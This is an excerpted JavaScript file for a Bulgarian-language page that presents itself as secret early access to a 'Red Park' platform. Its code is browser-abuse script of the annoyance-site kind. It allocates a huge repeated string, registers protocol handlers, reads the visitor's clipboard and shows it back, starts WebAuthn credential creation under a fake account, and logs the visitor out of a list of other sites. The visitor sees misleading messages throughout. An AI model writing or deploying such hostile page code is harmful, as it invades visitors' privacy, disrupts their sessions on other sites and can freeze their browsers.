/*
  ...
  Ранен достъп до тайна платформа.
...
const PHRASES = [
  'здравей, добре дошли в red park',
  'тайният достъп е активиран',
  'това беше грешка',
  'не затваряй прозореца',
  'red park secret access',
  'ранен достъп потвърден',
...
const veryLongString = repeatStringNumTimes(repeatStringNumTimes('Бяхте превключени в Red Park!!1 ', 100), 1500)
...
function registerProtocolHandlers () {
  ...
  protocolWhitelist.forEach(proto => {
    navigator.registerProtocolHandler(proto, handlerUrl, 'Red Park')
  })
}
...
function requestClipboardRead () {
  try {
    navigator.clipboard.readText().then(
      data => {
        if (!window.ApplePaySession) {
          window.alert("Успешно прочетени данни от клипборда: '" + data + "'")
        }
      },
      () => {}
    )
    ...
    const createCredentialDefaultArgs = {
      publicKey: {
        ...
        user: {
          ...
          name: 'user@redpark.secret',
          displayName: 'Red Park User'
        },
...
function superLogout () {
  ...
  for (const name in LOGOUT_SITES) {
    ...
    div.innerText = `Излизане от ${name}...`
